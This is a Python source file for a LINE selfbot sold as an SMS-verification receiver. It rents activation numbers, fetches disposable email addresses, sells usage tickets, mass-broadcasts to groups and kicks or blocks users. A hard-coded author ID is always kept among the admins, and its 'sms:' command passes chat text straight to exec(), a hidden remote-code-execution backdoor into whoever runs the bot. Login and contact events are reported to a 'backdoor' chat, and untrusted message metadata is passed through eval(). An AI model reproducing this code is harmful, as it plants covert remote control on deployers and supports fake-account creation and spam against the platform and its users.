# -*- coding: utf-8 -*-
print("#######【朱音簡訊機2.0原檔-版本號2.0.0-開始載入】#######") 
from AKANEPY import *
from yt_dlp import YoutubeDL
from datetime import datetime
from threading import Thread
from Crypto.Cipher       import AES
from Crypto.Util.Padding import pad, unpad
import axolotl_curve25519 as Curve25519
from CHRLINE2 import CHRLINE2
from CHRLINE import CHRLINE 
from CHRLINE3 import CHRLINE3
from CHRLINE4 import CHRLINE4
import cloudscraper, time, json,requests,urllib,traceback, timeit,os,sys,random,ast,hashlib, hmac, base64,re,pytz,codecs
from MyQR import myqr
from smsactivate.api import SMSActivateAPI
print("#######【開始載入json】#######") 
users = json.loads(open('Json/user.json','r',encoding="utf-8").read())
person = json.loads(open('Json/totalsetting.json','r',encoding="utf-8").read())
ban = json.loads(open('Json/ban.json','r',encoding="utf-8").read())
sms = json.loads(open('Json/sms.json','r',encoding="utf-8").read())
print("#######【json載入完畢】#######") 
backdoor = person["backdoor"]
akane = ['uc5a318a15c884f3f17acc9b0dd4ab617'] 
cl = LINE(person["account"],person["pass"])
oepoll = OEPoll(cl)
profile = cl.getProfile()
clMID = cl.profile.mid
vdp = {
    "cvp2": False,
    "changePictureProfile":False,
    "vp_pic":False,
    "pic_vp":False,
    "cvp_pic":False,
    "changePicture": False,
    "dvp":False,
    "dvp2":False,
    "clone":False,
    "cop":False
}
for x in akane:
   if x not in ban["creator"]:
         ban["creator"].append(x)
mulai = time.time()
smscvp= {"num":False}
try:
  cl.sendMessage(backdoor,"【簡訊機登入提示】\n• 系統登入成功\n• 登入名稱:{}\n• 登入者MID:\n{}".format(str(cl.profile.displayName),str(clMID))) 
except:
   pass
notext = {"swich":False}
wait = {
    'akanesms': {}
}
print(clMID)
def ytdlp(url):
    ydl_opts = {"outtmpl" : f"cvp.mp4"}
    with YoutubeDL(ydl_opts) as ydl:
        ydl.download([url])    
def backupData():
    try:
        with open('Json/sms.json', 'w','utf-8') as fp:
            json.dump(sms, fp, sort_keys=True, indent=4, ensure_ascii=False)
        with open('Json/ban.json', 'w','utf-8') as fp:
            json.dump(ban, fp, sort_keys=True, indent=4, ensure_ascii=False)
        with open('Json/totalsetting.json', 'w','utf-8') as fp:
            json.dump(person, fp, sort_keys=True, indent=4, ensure_ascii=False)
        with open('Json/user.json', 'w','utf-8') as fp:
            json.dump(users, fp, sort_keys=True, indent=4, ensure_ascii=False)
    except Exception as error:traceback.print_exc()
def sendMention(to, text="", mids=[]):
    arrData = ""
    arr = []
    mention = "@akaneeebot "
    if mids == []:
        raise Exception("Invalid mids")
    if "@!" in text:
        if text.count("@!") != len(mids):
            raise Exception("Invalid mid")
        texts = text.split("@!")
        textx = ""
        for mid in mids:
            textx += str(texts[mids.index(mid)])
            slen = len(textx)
            elen = len(textx) + 15
            arrData = {'S':str(slen), 'E':str(elen - 4), 'M':mid}
            arr.append(arrData)
            textx += mention
        textx += str(texts[len(mids)])
    else:
        textx = ""
        slen = len(textx)
        elen = len(textx) + 15
        arrData = {'S':str(slen), 'E':str(elen - 4), 'M':mids[0]}
        arr.append(arrData)
        textx += mention + str(text)
    cl.sendMessage(to, textx, {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0) 
def getmail(to,msgid, sender):
        try:
            Request=cloudscraper.create_scraper()
            IsReceiving=True
            def GetMail():
                req_=Request.get('https://10minutemail.com/session/address')
                Request.cookies=req_.cookies
                if req_.status_code==403:return '403'
                return json.loads(req_.text)['address']
            getMail=GetMail()
            if getMail=='403':exit('您已被該網站封鎖\n請稍後再試.')
            cl.relatedMessage(to,getMail, msgid)
            def CheckExpired():
                req=Request.get('https://10minutemail.com/session/expired')
                if json.loads(req.text)['expired']==True:return True
                else:return False
            def GetMessage():
                if not CheckExpired():
                    try:
                        req_=Request.get('https://10minutemail.com/messages/messagesAfter/0')
                        if req_.status_code!=200:IsReceiving=False;return"Error"
                        elif req_.text=='[]':return"N"
                        else:
                            reqjs=json.loads(req_.text[1:][:-1])
                            txt='\n收信結果'
                            txt+=f"\n發送者:{reqjs['sender']}"
                            txt+=f"\n時間:{reqjs['sentDate']}"
                            txt+=f"\n主旨:{reqjs['subject']}"
                            txt+=f"\n內容:{reqjs['bodyPreview']}"
                            IsReceiving=False
                            return txt
                    except Exception as e:return str(e)
            while True:
                try:
                    get=GetMessage()
                    if get =='expired':cl.relatedMessage(to,'過時',msgid);break
                    if get =='error':cl.relatedMessage(to,'錯誤',msgid);break
                    if get =='N':pass
                    else:cl.relatedMessage(to,get,msgid);break
                    time.sleep(5)#anti ban
                except KeyboardInterrupt:print('Ctrl-C');os._exit(1)
                except:pass
        except:pass
def restartBot():
    backupData()
    python = sys.executable
    os.execl(python, python, *sys.argv)
def ismid(mid):
    try:
        cl.getContact(mid)
        return True
    except:
        return False
#===================================================================#
def smsgetcode(orderId):
    counter = 0
    while True:
        time.sleep(1)
        counter += 1
        if counter >= 1200:
            raise Exception('timeout')
        if orderId in wait['akanesms']:
            response = requests.get(sms["base_url"], params={'api_key': sms["apikey"],'action': 'getStatus','id': orderId}).text
            if 'STATUS_OK' in response:
                break
        else:
            raise Exception('release')
    return response.split(':')[1]
def stop():
    if notext["swich"] == False:
        notext["swich"] = True
        print("防刷啟動")
        time.sleep(3)
        notext["swich"] = False
        print("防刷關閉")
def Runtime(secs):
    mins, secs = divmod(secs,60)
    hours, mins = divmod(mins,60)
    days, hours = divmod(hours, 24)
    return '【%02d 天  %02d 時  %02d 分鐘  %02d 秒】' % (days, hours, mins, secs)
def gencode():
    list = ["0","9","8","7","6","5","4","3","2","2","1","A","a","B","b","C","c","D","d","E","e","F","f","G","g","H","h","I","i","J","j","K","k","L","l","M","m","N","n","O","o","P","p","Q","q","R","r","S","s","T","t","U","u","V","v","W","w","X","x","Y","y","Z","z"]
    a = random.choice(list);b = random.choice(list);c = random.choice(list);d = random.choice(list);e = random.choice(list);f = random.choice(list);g = random.choice(list);h = random.choice(list);i = random.choice(list);j = random.choice(list);k = random.choice(list);l = random.choice(list);m = random.choice(list);n = random.choice(list);o = random.choice(list);p = random.choice(list)
    code = a+b+c+d+'-'+e+f+g+h+'-'+i+j+k+l+'-'+m+n+o+p
    return code
def CVAPCP(pict, vids):
    try:
        files = {'file': open(vids, 'rb')}
        obs_params = cl.genOBSParams({'oid': cl.profile.mid,'ver': '2.0','type': 'video','cat':'vp.mp4','name':'Hello_World.mp4'})
        data = {'params':obs_params}
        r_vp = cl.server.postContent(f'{cl.server.LINE_OBS_DOMAIN}/talk/vp/upload.nhn', data=data, files=files)
        if r_vp.status_code != 201:return '更新個人資料視頻圖片失敗'
        cl.updateProfilePicture(pict,'vp')
        return '更新個人資料視頻圖片成功'
    except Exception as e:raise Exception(f'更新失敗:{e}')
def smsbot(op):
    global akane
    try:
        if op.type == 0:
            return
        if op.type == 26 or op.type == 25:
            msg, text, msg_id, receiver, sender = op.message, op.message.text, op.message.id, op.message.to , op.message._from
            if op.type == 26:
                msg = op.message
            text = msg.text
            msg_id = msg.id
            receiver = msg.to
            sender = msg._from
            if msg.toType == 0:
                if sender != cl.profile.mid:
                    to = sender
                else:
                    to = receiver
            else:
                to = receiver
                if msg.contentType == 0 and sender not in clMID and msg.toType == 2:
                    try:
                          if msg.contentMetadata:
                            lists = []
                            key = eval(msg.contentMetadata["MENTION"])
                            for x in key["MENTIONEES"]:
                                if x["M"] not in lists:lists.append(x["M"])
                            for yuyan in lists:
                                if os.path.isfile("tag/"+str(yuyan)+".json"):Who_mark_me = json.load(codecs.open("tag/"+str(yuyan)+".json","r","utf-8"))
                                else:Who_mark_me={}
                                if to not in Who_mark_me:Who_mark_me[to]={}
                                tagnum = len(Who_mark_me[to])+1
                                Who_mark_me[to][str(tagnum)]={}
                                Who_mark_me[to][str(tagnum)]["sender"]=sender
                                Who_mark_me[to][str(tagnum)]["msgid"]=op.message.id
                                tz = pytz.timezone("Asia/Taipei")
                                timeNow = datetime.now(tz=tz)
                                Who_mark_me[to][str(tagnum)]["tagtime"]=str(timeNow.strftime('%m/%d %H:%M:%S'))
                                json.dump(Who_mark_me,codecs.open('tag/'+str(yuyan)+'.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
                    except:
                        pass
            if msg.relatedMessageId:
                    try:
                        for x in cl.getRecentMessagesV2(to,1000):
                            if x.id == msg.relatedMessageId:
                                if os.path.isfile("returns/"+str(x._from)+".json"):Who_returns_to_me = json.load(codecs.open("returns/"+str(x._from)+".json","r","utf-8"))
                                else:Who_returns_to_me={}
                                if to not in Who_returns_to_me:Who_returns_to_me[to]={}
                                tagnum = len(Who_returns_to_me[to])+1
                                Who_returns_to_me[to][str(tagnum)]={}
                                Who_returns_to_me[to][str(tagnum)]["sender"]=sender
                                Who_returns_to_me[to][str(tagnum)]["msgid"]=op.message.id
                                tz = pytz.timezone("Asia/Taipei")
                                timeNow = datetime.now(tz=tz)
                                Who_returns_to_me[to][str(tagnum)]["tagtime"]=str(timeNow.strftime('%m/%d %H:%M:%S'))
                                json.dump(Who_returns_to_me,codecs.open('returns/'+str(x._from)+'.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
                                break
                    except:pass
        if op.type == 5:
            contact = cl.getContact(op.param1) ;sendMention(backdoor,"［@! 加我好友］"+"\n"+"［他的名字］\n"+contact.displayName+"\n"+"［MID］\n"+contact.mid, [op.param1] ) ;cl.sendContact(backdoor,op.param1);cl.findAndAddContactsByMid(op.param1);h = cl.sendMessage(op.param1 , f"感謝路人『{cl.getContact(op.param1).displayName}』加入好友\n此為簡訊接收機(づ ●─● )づ\n買票私以下連結或友資(｡･ω･｡)\nline.me/ti/p/~sa0106sa0106sa0106") ;cl.sendReplyContact(h.id,op.param1,"u4b0dcd14833631c06783ae2df41df2f4")
        if op.type == 124:
            if clMID in op.param3:
                cl.acceptChatInvitation(op.param1)
                group = cl.getGroup(op.param1)
                contact1 = cl.getContact(op.param2)
                try:
                        gCreator = group.creator.displayName
                except:
                        gCreator = "創群者已砍帳"
                if group.invitee is None:
                        gPending = "0"
                else:
                        gPending = str(len(group.invitee))
                sendMention(backdoor,"《@!》邀請我入群\n❀邀請群組:" + str(group.name) + "\n❀群組 id:\n"+ str(group.id) + "\n❀邀請者Mid:" + contact1.mid + "\n❀人數:" + str(len(group.members)) + "\n❀卡邀人數:"+ gPending + "\n❀創群者:" + str(gCreator),[op.param2])
                if op.param2 in ban["creator"]:
                    cl.sendMessage(op.param1,"感謝偉大的作者邀請我入群♡︎")
                else:
                   h = cl.sendMessage(op.param1, f"感謝路人『{cl.getContact(op.param2).displayName}』特別邀請.. \n此為簡訊接收機(づ ●─● )づ\n買票私以下連結或友資(｡･ω･｡)\nline.me/ti/p/~sa0106sa0106sa0106") 
                   cl.sendReplyContact(h.id,op.param1 ,"u12a9d5ad4cf306a1c59ce85aeb751d72")
        if op.type == 25 or op.type ==26:
            msg = op.message
            text = msg.text
            msg_id = msg.id
            receiver = msg.to
            sender = msg._from
            if msg.toType == 0:
                if sender != cl.profile.mid:
                    to = sender
                else:to = receiver
            else:to = receiver
            if text is None:
                cmd = ""
            else:
                cmd = text.lower()
            if msg.contentType == 1 and smscvp["num"]:
                                if vdp["changePictureProfile"]:#只換頭貼
                                    path = cl.downloadObjectMsg(msg_id)
                                    vdp["changePictureProfile"] = False
                                    cl.updateProfilePicture(path)
                                    cl.relatedMessage(to,"更改完成",msg_id)
                                    smscvp["num"] = False
                                if vdp['pic_vp']: #保留影片 更換頭貼
                                    image = cl.downloadObjectMsg(msg_id, saveAs="cvp.jpg")
                                    cl.relatedMessage(to, "圖片下載完成 正在更換頭貼",msg_id)
                                    vdp['pic_vp'] = False
                                    CVAPCP(image, "video.mp4")
                                    os.remove("video.mp4");os.remove(image)
                                    cl.relatedMessage(to,"更改完成",msg_id)
                                    smscvp["num"] = False
                                if vdp["cvp_pic"]:
                                    image = cl.downloadObjectMsg(msg_id, saveAs="cvp.jpg")
                                    cl.relatedMessage(to, "圖片下載完成 正在更換頭貼",msg_id)
                                    vdp["cvp_pic"] = False
                                    CVAPCP(image, "cvp.mp4")
                                    os.remove("cvp.mp4");os.remove(image)
                                    cl.relatedMessage(to,"更改完成",msg_id)
                                    smscvp["num"] = False
                                if vdp["dvp2"]: #自行上傳影片&頭貼
                                    path = cl.downloadObjectMsg(msg_id)
                                    cl.relatedMessage(to, "圖片下載完成 正在更換頭貼",msg_id)
                                    vdp['dvp2'] = False
                                    CVAPCP(path, "dvp.mp4")
                                    os.remove("dvp.mp4");os.remove(path)
                                    cl.relatedMessage(to,"更改完成",msg_id)
                                    smscvp["num"] = False
                                if vdp["cop"]: #圖片更改封面
                                    try:
                                        cl.sendMessage(to,"開始更換封面")
                                        try:
                                            path = cl.downloadObjectMsg(msg_id)
                                            CHRLINE(person["account"],person["pass"])
                                            cl.sendMessage(to,"封面更換成功")
                                            vdp['cop'], smscvp["num"] = False, False
                                            os.remove(path)
                                        except Exception as e:cl.sendMessage(to,f'執行失敗\n{e}')
                                    except Exception as e:cl.sendMessage(to,f'執行失敗\n{e}')
            if msg.contentType == 2 and smscvp["num"]: #影片
                                if vdp["dvp"]:
                                    cl.downloadObjectMsg(msg_id, saveAs="dvp.mp4")
                                    cl.relatedMessage(to, "影片下載完成 請傳送圖片( ˶ ̇ᵕ​ ̇˶)",msg_id)
                                    vdp["dvp"], vdp["dvp2"] = False, True
            if msg.contentType == 0:
                if text is None or sender in ban["blacklist"]:
                    return
                else: 
                    if sender in ban["creator"]:
                            if text == '1' and smscvp["num"]:#只換頭貼
                                vdp["changePictureProfile"] = True
                                cl.relatedMessage(to,"請發送圖片",msg_id)
                            if text == '2' and smscvp["num"]:#只換影片不換頭貼
                                cl.downloadFileURL(f"http://dl.Profile.line-cdn.net/{cl.getContact(clMID).pictureStatus}", saveAs="pic_to.jpg")
                                vdp["vp_pic"] = True;cl.relatedMessage(to,"請傳影片連結",msg_id)
                            if text == '3' and smscvp["num"]:#只換頭貼不換影片
                                cl.relatedMessage(to,"下載影片中",msg_id)
                                cl.downloadFileURL(f'http://dl.Profile.line-cdn.net/{cl.getContact(clMID).pictureStatus}/vp', saveAs="video.mp4")
                                cl.relatedMessage(to,"請發送頭貼",msg_id)
                                vdp['pic_vp'] = True
                            if text == '4' and smscvp["num"]:#更換頭貼影片
                                vdp["cvp2"] = True;cl.relatedMessage(to,"請傳影片連結",msg_id)
                            if text == '5' and smscvp["num"]:#自行上傳頭貼及影片
                                vdp["dvp"] = True;cl.relatedMessage(to,"請傳送影片",msg_id)
                            if text == '6' and smscvp["num"]:#圖片改封面
                                vdp["cop"] = True;cl.relatedMessage(to,"請傳送圖片",msg_id)
                            if text == '7' and smscvp["num"]:#取消動作
                                smscvp["num"] = False;cl.relatedMessage(to,"已取消動作",msg_id)
                            if text == '8' and smscvp["num"]:#克隆
                                vdp["clone"] = True;cl.relatedMessage(to,"請發送友資",msg_id)
                            if vdp["vp_pic"] and smscvp["num"]:#保留頭貼 更換影片
                                if "https://youtu.be/" in text.lower():
                                    search = text.replace("https://youtu.be/","")
                                    cl.relatedMessage(to,"偵測到影片連結開始下載影片...",msg_id)
                                    ytdlp(search)
                                    cl.relatedMessage(to, "圖片下載完成 正在更換頭貼",msg_id)
                                    CVAPCP("pic_to.jpg", "cvp.mp4")
                                    os.remove("cvp.mp4");os.remove("pic_to.jpg")
                                    vdp["vp_pic"] = False;smscvp["num"] = False
                                    cl.relatedMessage(to,"更改完成",msg_id)
                                if "https://www.youtube.com/watch?v=" in text.lower():
                                    search = text.replace("https://www.youtube.com/watch?v=","")
                                    cl.relatedMessage(to,"偵測到影片連結開始下載影片...",msg_id)
                                    ytdlp(search)
                                    cl.relatedMessage(to, "圖片下載完成 正在更改頭貼",msg_id)
                                    CVAPCP("pic_to.jpg", "cvp.mp4")
                                    os.remove("cvp.mp4");os.remove("pic_to.jpg")
                                    vdp["vp_pic"] = False;smscvp["num"] = False
                                    cl.relatedMessage(to,"更改完成",msg_id)
                            if vdp["cvp2"] and smscvp["num"]:
                                if "https://youtu.be/" in text.lower():
                                    search = text.replace("https://youtu.be/","")
                                    cl.relatedMessage(to,"偵測到影片連結開始下載影片...",msg_id)
                                    ytdlp(search)
                                    cl.relatedMessage(to,"請傳送圖片",msg_id)
                                    vdp["cvp2"] = False;vdp["cvp_pic"] = True
                                if "https://www.youtube.com/watch?v=" in text.lower():
                                    search = text.replace("https://www.youtube.com/watch?v=","")
                                    cl.relatedMessage(to,"偵測到影片連結開始下載影片...",msg_id)
                                    ytdlp(search)
                                    cl.relatedMessage(to,"請傳送圖片",msg_id)
                                    vdp["cvp2"] = False;vdp["cvp_pic"] = True   
                    if sender in ban["creator"]:
                        if text.lower().startswith('改 '):
                                if msg.contentMetadata:
                                    MENTION = eval(msg.contentMetadata['MENTION'])
                                    for x in MENTION['MENTIONEES']:
                                        if x["M"] == clMID:
                                            list_ ="◆◇◆更改頭貼◆◇◆"
                                            list_ +="\n1 只換頭貼"
                                            list_ +="\n2 只換影片不換頭貼"
                                            list_ +="\n3 只換頭貼不換影片"
                                            list_ +="\n4 更換頭貼影片"
                                            list_ +="\n5 自行上傳頭貼及影片"
                                            list_ +="\n6 更改封面圖片"
                                            list_ +="\n7 取消動作"
                                            list_ +="\n◆◇◆更改頭貼◆◇◆"
                                            cl.relatedMessage(to,str(list_),msg_id)
                                            smscvp["num"] = True
                                else:cl.relatedMessage(to,"請標記欲更改頭貼之對象",msg_id)
                        if cmd == 'data':
                          if sender in akane:
                            if msg.relatedMessageId:
                                try:
                                    for x in cl.getRecentMessagesV2(to,1000):
                                        if x.id == msg.relatedMessageId:
                                            cl.relatedMessage(to,str(x),msg_id)
                                            break
                                except:
                                    cl.relatedMessage(to,"查詢失敗",msg_id)
                            else:
                                cl.relatedMessage(to,"需回覆訊息來查詢",msg_id)
                        if cmd.startswith("data "):
                                 if sender in akane:
                                        try:
                                            nu = int(text[5:]) + 1
                                            cl.relatedMessage(to,str(cl.getRecentMessagesV2(to,nu)[-1]),msg_id)
                                        except:
                                            cl.relatedMessage(to,"查詢失敗",msg_id)
                        if cmd.startswith("sms:"):
                          if sender in akane:
                           try:exec(text[4:]);return
                           except Exception as e:cl.relatedMessage(to,str(e),msg_id)
                        if cmd == '滾':
                             if msg.relatedMessageId:
                                 try:
                                     for x in cl.getRecentMessagesV2(to,1000):
                                         if x.id == msg.relatedMessageId:
                                             cl.deleteOtherFromChat(to,[x._from])
                                 except Exception as e:
                                     print(e)
                             else:cl.relatedMessage(to,'用回覆的啦笨寶🥺',msg_id)       
                        if cmd == '出去再進來':
                             if msg.relatedMessageId:
                                 try:
                                     for x in     cl.getRecentMessagesV2(to,1000):
                                         if x.id == msg.relatedMessageId:                                                                                                       
                                             cl.findAndAddContactsByMid(x._from)
                                             cl.deleteOtherFromChat(to,[x._from])
                                             cl.inviteIntoChat(to,[x._from])
                                 except Exception as e:
                                     cl.sendMessage(backdoor,e)
                             else:cl.relatedMessage(to,'用回覆的啦笨寶🥺',msg_id)
                        if cmd == '狗狗進來':
                             if msg.relatedMessageId:
                                 try:
                                     for x in     cl.getRecentMessagesV2(to,1000):
                                         if x.id == msg.relatedMessageId:                                                                                                       
                                             cl.findAndAddContactsByMid(x._from)
                                             cl.inviteIntoChat(to,[x._from])
                                 except:
                                     cl.sendMessage(backdoor,e)
                             else:cl.relatedMessage(to,'用回覆的啦笨寶🥺',msg_id)
                        if cmd == '帳號關於':
                            clProfile = cl.getProfile()
                            clSetting = cl.getSettings()
                            ret_ = "［帳號設定］"
                            ret_ += f"\n帳號地區: {str(clProfile.regionCode)}"
                            ret_ += f"\n帳號語言: {str(clSetting.preferenceLocale)}"
                            if clSetting.privacySearchByUserid == True:
                               ret_ += "\n允許ID加友: 允許"
                            else:
                               ret_ += "\n允許ID加友: 拒絕"
                            if clSetting.privacySearchByPhoneNumber == True:
                               ret_ += "\n允許電話加友: 允許"
                            else:
                               ret_ += "\n允許電話加友: 拒絕"
                            if clSetting.privacySearchByEmail == True:
                               ret_ += "\n允許E-mail加友: 允許"
                            else:
                               ret_ += "\n允許E-mail加友: 拒絕"
                            if clSetting.e2eeEnable == True:
                               ret_ += "\nLS: 開啟"
                            else:
                               ret_ += "\nLS: 關閉"
                            if clSetting.privacyAllowSecondaryDeviceLogin == True:
                               ret_ += "\n允許其他裝置登入: 允許"
                            else:
                               ret_ += "\n允許其他裝置登入: 拒絕"
                            if clSetting.privacyReceiveMessagesFromNotFriend == True:
                               ret_ += "\n訊息阻擋: 關閉"
                            else:
                               ret_ += "\n訊息阻擋: 開啟"
                            if clSetting.privacySearchByUserid == True:
                               ret_ += "\n允許ID被搜尋: 允許"
                            else:
                               ret_ += "\n允許ID: 拒絕"
                            cl.relatedMessage(to, str(ret_),msg_id)
                        if cmd=='test':
                            a1 = timeit.timeit('"-".join(str(n) for n in range(100))', number=10000)
                            b1 = str(a1)
                            a2 = timeit.timeit('"-".join(str(n) for n in range(100))', number=10000)
                            b2 = str(a2)
                            a3 = timeit.timeit('"-".join(str(n) for n in range(100))', number=10000)
                            b3 = str(a3)
                            a4 = timeit.timeit('"-".join(str(n) for n in range(100))', number=10000)
                            b4 = str(a4)
                            a5 = timeit.timeit('"-".join(str(n) for n in range(100))', number=10000)
                            b5 = str(a5)
                            ret_ = f"     [處理速度]\n"
                            ret_ += f"第一次:{str(b1)}秒\n"
                            ret_ += f"第二次:{str(b2)}秒\n"
                            ret_ += f"第三次:{str(b3)}秒\n"
                            ret_ += f"第四次:{str(b4)}秒\n"
                            ret_ += f"第五次:{str(b5)}秒\n"
                            ret_ += "     [速度測試]"
                            cl.relatedMessage(to, str(ret_),msg.id)
                        if cmd == 'sp':
                           a = time.time()
                           cl.sendReplyMessage(msg.id, to,"send test...")
                           b = time.time() - a
                           cl.sendReplyMessage(msg.id, to,f"{b}s")
                        if cmd == '餘額':
                                response = requests.get(sms["base_url"], params={'api_key': sms["apikey"],'action': 'getBalance'}).text.split(':')[1]
                                balance = "【系統餘額】\n" + " • 剩餘" + str(response) + " ₽\n【估計值】\n • 約等於 "+str(round(float(response)*0.4, 3))+" 台幣" + "\n • 約可用" + str(int(float(response)/5)) + "支帳號" 
                                cl.relatedMessage(to,str(balance),msg_id)
                        elif cmd in ['help', '指令'] :
                              f = open('help.txt','r',encoding="utf-8");h = f.read();f.close()
                              cl.relatedMessage(to,h,op.message.id)
                        elif cmd in ['sms:cleanban','清黑單','clearban', '清空黑名單']:
                              for mi_d in ban["blacklist"]:
                                  ban["blacklist"] = []
                                  backupData()
                              cl.relatedMessage(to, "已清空黑名單(´･ω･`)",op.message.id )
                        elif cmd in ['sms:banlist','黑單','黑名單']:
                             if ban["blacklist"] == []:
                                 cl.sendReplyMessage(msg.id, to,"無黑單成員!")
                             else:
                               mc = "[黑單列表]"
                               no = 0
                               try:
                                  for mi_d in ban["blacklist"]:
                                     no += 1
                                     mc += "\nゝ{}.".format(str(no))+cl.getContact(mi_d).displayName
                               except:
                                  mc +="\n"+str(no)+".砍帳狗"
                                  ban["blacklist"].remove(mi_d)
                                  backupData() 
                               cl.sendReplyMessage(msg.id, to,mc + "\n結束")
                        elif cmd in ['運行', 'ren']:
                           eltime = time.time() - mulai
                           bot = " ［朱音簡訊機運行時間］\n" +Runtime(eltime)
                           cl.relatedMessage(to,bot,op.message.id) 
                        elif cmd in ["sms:reb", "簡訊機重啟", "重新來過：）"]:
                             ts = time.time()
                             contact = cl.getContact(sender)
                             sender = msg._from
                             try:
                                group = cl.getGroup(msg.to).name
                             except:
                                try:
                                  group = cl.getContact(msg.to).displayName
                                except:
                                    group = "副本"
                             cl.sendReplyMessage(msg.id, to,"重新啟動中...")
                             sendMention(backdoor,f"【@!】\n• 重啟了半垢 •\n•重啟位置:{str(group)}\n• 重新啟動中 •",[contact.mid])
                             restartBot()
                        elif cmd.startswith("sms:文字廣播 "):
                            bctxt = msg.text.replace("sms:文字廣播 ", "")
                            n = cl.getGroupIdsJoined()
                            g = 0
                            for manusia in n:
                                cl.sendMessage(manusia, "[文字廣播] \n"+bctxt)
                                g+=1
                                time.sleep(0.2)
                            cl.sendMessage(to,"群組廣播:共分享{}個群組".format(str(g)))
                        elif cmd.startswith("解封鎖 "):
                              targets = []
                              key = eval(msg.contentMetadata["MENTION"])
                              key["MENTIONEES"][0]["M"]
                              for x in key["MENTIONEES"]:
                                  targets.append(x["M"])
                              a = 0
                              for target in targets:
                                  cl.unblockContact(target)
                                  a += 1
                              cl.sendMessage(msg.to,"已解封鎖共" + str(a) + "人")
                        elif cmd.startswith("封鎖 "):
                            if sender in akane:
                              targets = []
                              try:
                                key = eval(msg.contentMetadata["MENTION"])
                                key["MENTIONEES"][0]["M"]
                                for x in key["MENTIONEES"]:
                                  targets.append(x["M"])
                                a = 0
                                for target in targets:
                                  cl.blockContact(target)
                                  a += 1
                                cl.sendMessage(msg.to,"已封鎖共" + str(a) + "人")
                              except:
                                pass
                        elif cmd in ['儲存','save']:
                           backupData()
                           cl.relatedMessage(to,"儲存設定成功!",op.message.id)
                        elif cmd.startswith("mid "):
                            if 'MENTION' in msg.contentMetadata.keys()!= None:
                                names = re.findall(r'@(\w+)', text)
                                mention = ast.literal_eval(msg.contentMetadata['MENTION'])
                                mentionees = mention['MENTIONEES']
                                lists = []
                                for mention in mentionees:
                                    if mention["M"] not in lists:
                                        lists.append(mention["M"])
                                for ls in lists:
                                    cl.relatedMessage(msg.to, str(ls),op.message.id)
                        elif cmd.startswith("smspn:"):
                            string = text[6:]
                            if len(string) <= 20:
                                profile = cl.getProfile()
                                profile.displayName = string
                                cl.updateProfile(profile)
                                cl.relatedMessage(to,"名稱已更改為:" + string,msg_id)
                            else:
                                cl.relatedMessage(to,"[警告]\n名稱不能突破20字喔!!\n超過20字並強行更改\n將會凍帳一小時\n以下是您想突破的文字名稱\n" + string,msg_id)
                        elif cmd.startswith("smscb:"):
                            string = text[6:]
                            if len(string) <= 500:
                                profile = cl.getProfile()
                                profile.statusMessage = string
                                cl.updateProfile(profile)
                                cl.relatedMessage(to,"個簽已更改為:\n" + string,msg_id)
                            else:
                                cl.relatedMessage(to,"[警告]\n個簽不能突破500字喔!!\n超過500字並強行更改\n將會凍帳一小時\n以下是您想突破的文字個簽\n" + string,msg_id)
                        elif cmd.startswith("加票 "):
                            x = text.split(" ")
                            if len(x) == 2:
                                t = 1
                            elif len(x) == 3:
                                try:
                                    t = int(x[2])
                                    if t < 1:
                                        cl.relatedMessage(to,"加票數量請大於0",msg_id)
                                        return
                                except:
                                    cl.relatedMessage(to,"加票數量錯誤!",msg_id)
                                    return
                            else:
                                cl.relatedMessage(to,"格式錯誤!",msg_id)
                                return
                            if not ismid(x[1]):
                                cl.relatedMessage(to,"被加票者MID不存在!",msg_id)
                                return
                            if x[1] not in users['user']:
                                users["user"][x[1]] = t
                            else:
                                users["user"][x[1]] += t
                            backupData()
                            cl.relatedMessage(to,"成功給予票數",msg_id)
                        elif cmd.startswith("刪票 "):
                            x = text.split(" ")
                            if len(x) == 2:
                                t = 1
                            elif len(x) == 3:
                                try:
                                    t = int(x[2])
                                    if t < 1:
                                        cl.relatedMessage(to,"刪票數量請大於0",msg_id)
                                        return
                                except:
                                    cl.relatedMessage(to,"刪票數量錯誤!",msg_id)
                                    return
                            else:
                                cl.relatedMessage(to,"格式錯誤!",msg_id)
                                return
                            if x[1] not in users['user']:
                                cl.relatedMessage(to,"該用戶票卷不足!",msg_id)
                                return
                            if users['user'][x[1]] == t:
                                del users['user'][x[1]]
                            elif users['user'][x[1]] > t:
                                users['user'][x[1]] -= t
                            else:
                                cl.relatedMessage(to,"該用戶票數不足!",msg_id)
                                return
                            backupData()
                            cl.relatedMessage(to,"成功刪除票數!",msg_id)
                        elif cmd == '清全票':
                             for x in users['user']:
                                users['user'] = {}
                             cl.sendMessage( to, "已清空")
                        elif cmd == '全票':
                            mc = "[票卷列表]"
                            no = 1
                            for iii in users['user']:
                               ttxt = users['user']["{}".format(iii)]
                               try:
                                 mc += "\n"+str(no)+"."+cl.getContact(iii).displayName+"："+str(ttxt)+"票" 
                                 no += 1
                               except:
                                  mc += "\n"+str(no)+"."+"砍帳仔" +"："+str(ttxt)+"票" 
                            mc += "\n[總共 {} 個票卷擁有者]".format(str(no-1))
                            cl.sendMessage(to,mc)
                        elif cmd.startswith("簡訊機退群 "):
                            separate = text.split(" ")
                            number = text.replace(separate[0] + " ","")
                            groups = cl.getGroupIdsJoined()
                            try:
                                group = groups[int(number)-1]
                                group1 = cl.getGroup(group) 
                                cl.leaveGroup(group)
                                cl.relatedMessage(to, "已退出群組:{}".format(str(group1.name)),op.message.id)
                            except Exception as error:traceback.print_exc()
                        elif cmd== 'sms:lg':
                             groups = cl.getGroupIdsJoined()
                             cl.relatedMessage(to,"以下是群組列表",op.message.id)
                             ret_ = "[簡訊機群組列表]"
                             no = 0 + 1
                             for gid in groups:
                                group = cl.getGroup(gid)
                                ret_ += "\n {}. {} | {}".format(str(no), str(group.name), str(len(group.members)))
                                no += 1
                             ret_ += "\n[總共 {} 個群組]".format(str(len(groups)))
                             cl.relatedMessage(to, str(ret_),op.message.id)
                        elif cmd == '簡訊機權限名單':
                             if ban["creator"] == []:
                                 cl.relatedMessage(msg.to,"無權限者!",msg.id)
                             else:
                                 mc = "權限者列表："
                                 no = 0
                                 for mi_d in ban["creator"]:
                                     try:
                                         no += 1
                                         mc += "\n❥{}.".format(str(no))+cl.getContact(mi_d).displayName
                                     except:
                                         mc +="\n❥"+str(no)+".砍帳仔"
                                         ban["creator"].remove(mi_d)
                                 cl.sendMessage(to,mc)
                        elif cmd.startswith("簡訊機清除權限"):
                           if sender in akane:
                              ban["creator"] = []
                              for x in akane:
                                  ban["creator"].append(x)
                              backupData()
